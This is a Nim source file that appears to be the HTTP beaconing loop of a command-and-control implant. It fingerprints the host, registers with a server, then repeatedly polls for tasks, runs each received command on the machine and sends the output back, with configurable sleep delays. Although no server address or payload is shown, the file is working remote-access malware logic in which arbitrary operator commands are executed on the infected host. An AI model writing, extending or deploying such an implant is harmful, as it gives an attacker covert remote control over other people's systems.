import ../utils/global
import ../utils/network/http_core
import ../utils/tasks/utils as tasks
import ../utils/actions/fingerprint
import ../capabilities/sleep

proc returnOutput() =
  # Sends pending task output back to the server
  if not tasks.check_output():
    return
  var batch = tasks.get_output()
  let sent = sendBatch(batch)
  batch.setLen(0)
  tasks.clear_tasks(sent.ok, sent.body)

proc main*(): void =
  # Main loop of the http channel that beacons, sends output and runs commands
  sendFingerprint()
  while true:
    let boot = sendRequest(hostTag)
    if boot.ok and boot.code == 200:
      break
    elif boot.code == 400 and isMissingHostResponse(boot.body):
      sendFingerprint()
    sleep_now()

  while true:
    returnOutput()
    sleep_now()
    var resp = sendRequest(hostTag)
    if resp.code == 400 and isMissingHostResponse(resp.body):
      sendFingerprint()
    elif resp.ok and resp.body.len > 0:
      tasks.run_command(move(resp.body))
      returnOutput()
    if secondDelayEnabled:
      sleep_now(secondDelay)
      returnOutput()
